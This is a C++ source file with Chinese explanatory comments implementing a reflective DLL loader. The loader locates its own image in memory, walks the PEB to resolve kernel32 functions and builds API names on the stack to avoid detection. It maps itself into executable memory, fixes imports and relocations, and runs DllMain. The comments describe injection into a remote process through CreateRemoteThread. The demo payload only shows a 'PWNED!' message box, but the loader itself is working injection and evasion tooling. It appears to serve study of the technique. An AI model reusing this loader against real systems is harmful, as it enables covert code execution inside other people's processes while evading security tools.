#include <windows.h>
#include <intrin.h>

//  1. 手动定义 Windows 内部结构体

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

//  2. 辅助函数

typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(WINAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

void _memcpy(void* dest, void* src, size_t len) {
    char* d = (char*)dest;
    char* s = (char*)src;
    while (len--) *d++ = *s++;
}
// 自定义字符串比较函数，代替标准库的 strcmp
int _strcmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

//  3. ReflectiveLoader (核心)
extern "C" __declspec(dllexport) ULONG_PTR ReflectiveLoader(LPVOID lpParameter) {
    //Windows 会自动把Injector（注射器）中的CreateRemoteThread函数的第5个参数 (pRemoteMem)塞进CPU的寄存器（x64下是RCX寄存器），当作ReflectiveLoader函数的第一个参数传进去。
    //所以传进来的lpParameter是Injector 通过 CreateRemoteThread 的第5个参数传进来的(DLL在远程内存的起始地址)

    // STEP 1: 基址定位
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)lpParameter;

    if (uiLibraryAddress == 0) {
        uiLibraryAddress = (ULONG_PTR)_ReturnAddress();
        while (true) {
            // 往前一个字节一个字节地找，直到找到 'MZ' (0x5A4D) 头
            if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
                ULONG_PTR uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
                if (uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024) {
                    if (((PIMAGE_NT_HEADERS)(uiLibraryAddress + uiHeaderValue))->Signature == IMAGE_NT_SIGNATURE) {
                        break;
                    }
                }
            }
            uiLibraryAddress--;
        }
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)uiLibraryAddress;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(uiLibraryAddress + pDos->e_lfanew);

    // STEP 2: 获取 Kernel32 
    PPEB pPeb = (PPEB)__readgsqword(0x60);

    // 链表遍历：需要跳 3 次才能找到 Kernel32
    // 1. Exe -> 2. Ntdll -> 3. Kernel32
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink - 0x10);
    HMODULE hKernel32 = (HMODULE)pLdr->DllBase;

    // 解析导出表
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hKernel32 +
        ((PIMAGE_NT_HEADERS)((LPBYTE)hKernel32 + ((PIMAGE_DOS_HEADER)hKernel32)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((LPBYTE)hKernel32 + pExport->AddressOfNames);
    WORD* pOrdinals = (WORD*)((LPBYTE)hKernel32 + pExport->AddressOfNameOrdinals);
    DWORD* pFuncs = (DWORD*)((LPBYTE)hKernel32 + pExport->AddressOfFunctions);

    LOADLIBRARYA pLoadLibraryA = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    // 为了防止 RDI 在重定位前访问全局 .rdata，我们使用字符数组在栈上构建字符串
    char strLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 };
    char strGetProcAddress[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
    char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
    char strNtFlush[] = { 'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e', 0 };

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* name = (char*)((LPBYTE)hKernel32 + pNames[i]);

        // 直接比较字符串
        if (_strcmp(name, strLoadLibraryA) == 0) {
            pLoadLibraryA = (LOADLIBRARYA)((LPBYTE)hKernel32 + pFuncs[pOrdinals[i]]);
        }
        else if (_strcmp(name, strGetProcAddress) == 0) {
            pGetProcAddress = (GETPROCADDRESS)((LPBYTE)hKernel32 + pFuncs[pOrdinals[i]]);
        }
        else if (_strcmp(name, strVirtualAlloc) == 0) {
            pVirtualAlloc = (VIRTUALALLOC)((LPBYTE)hKernel32 + pFuncs[pOrdinals[i]]);
        }
        else if (_strcmp(name, strNtFlush) == 0) {
            pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)((LPBYTE)hKernel32 + pFuncs[pOrdinals[i]]);
        }
    }

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) return 0;

    // STEP 3: 申请内存
    ULONG_PTR uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!uiBaseAddress) return 0;

    // STEP 4: 复制 Headers
    _memcpy((void*)uiBaseAddress, (void*)uiLibraryAddress, pNt->OptionalHeader.SizeOfHeaders);

    // STEP 5: 复制 Sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        void* dest = (void*)(uiBaseAddress + pSection[i].VirtualAddress);
        void* src = (void*)(uiLibraryAddress + pSection[i].PointerToRawData);
        _memcpy(dest, src, pSection[i].SizeOfRawData);
    }

    // STEP 6: 修复导入表
    PIMAGE_DATA_DIRECTORY pImportDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(uiBaseAddress + pImportDir->VirtualAddress);
        while (pImportDesc->Name) {
            char* szModName = (char*)(uiBaseAddress + pImportDesc->Name);
            HMODULE hImportMod = pLoadLibraryA(szModName);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(uiBaseAddress + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)(uiBaseAddress + pImportDesc->OriginalFirstThunk);
            if (!pImportDesc->OriginalFirstThunk) pOrigThunk = pThunk;

            while (pOrigThunk->u1.AddressOfData) {
                if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    pThunk->u1.Function = (ULONG_PTR)pGetProcAddress(hImportMod, (char*)(pOrigThunk->u1.Ordinal & 0xFFFF));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pIbN = (PIMAGE_IMPORT_BY_NAME)(uiBaseAddress + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (ULONG_PTR)pGetProcAddress(hImportMod, (char*)pIbN->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImportDesc++; // 处理下一个依赖的 DLL
        }
    }

    // STEP 7: 修复重定位
    PIMAGE_DATA_DIRECTORY pRelocDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (pRelocDir->Size) {
        ULONG_PTR uiDelta = uiBaseAddress - pNt->OptionalHeader.ImageBase;
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(uiBaseAddress + pRelocDir->VirtualAddress);
        while (pReloc->SizeOfBlock) {
            DWORD dwCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pList = (WORD*)((LPBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < dwCount; i++) {
                if (pList[i] > 0) {
                    DWORD type = pList[i] >> 12;
                    DWORD offset = pList[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONG_PTR*)(uiBaseAddress + pReloc->VirtualAddress + offset) += uiDelta;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD*)(uiBaseAddress + pReloc->VirtualAddress + offset) += (DWORD)uiDelta;
                    }
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pReloc + pReloc->SizeOfBlock);
        }
    }

    // STEP 8: 执行
    if (pNtFlushInstructionCache) pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
    // 计算 DllMain 的地址
    ULONG_PTR uiEntry = uiBaseAddress + pNt->OptionalHeader.AddressOfEntryPoint;
    // 调用 DllMain
    ((DLLMAIN)uiEntry)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);

    return uiEntry;
}

//  4. DllMain
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // 弹窗测试 (栈字符串)
        char title[] = { 'R', 'D', 'I', 0 };
        char msg[] = { 'P', 'W', 'N', 'E', 'D', '!', 0 };
        MessageBoxA(NULL, msg, title, MB_OK);
    }
    return TRUE;
}